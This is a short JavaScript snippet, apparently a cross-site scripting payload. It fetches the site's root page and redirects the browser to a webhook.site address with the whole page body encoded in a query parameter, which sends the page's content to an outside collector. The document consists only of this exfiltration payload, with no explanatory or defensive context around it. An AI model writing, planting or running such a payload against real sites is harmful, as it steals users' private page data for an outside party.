var url;

fetch('/')
  .then(res => res.text())
  .then(data => url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + encodeURIComponent(data))
  .then(() => document.location.replace(url))

document.location.replace(url);
